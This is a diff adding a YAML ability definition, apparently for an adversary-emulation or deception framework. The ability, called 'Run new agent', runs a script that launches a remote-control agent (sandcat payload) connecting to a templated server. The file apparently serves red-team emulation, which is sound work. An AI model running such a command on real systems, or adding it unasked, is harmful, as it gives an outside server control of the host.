@@ -1,0 +1,18 @@
+---
+- id: deception-user-run-agent
+  name: Run new agent
+  description: Run new agent on a user
+  tactic: deception-privilege-escalation
+  technique:
+    attack_id: T9000
+    name: 'Deception'
+  repeatable: True
+  platforms:
+    linux:
+      sh:
+        command: './runHackerAgent.sh #{server} && sleep 1'
+        cleanup:
+        parsers: []
+        payloads:
+        - runHackerAgent.sh
+        - sandcat.go-linux
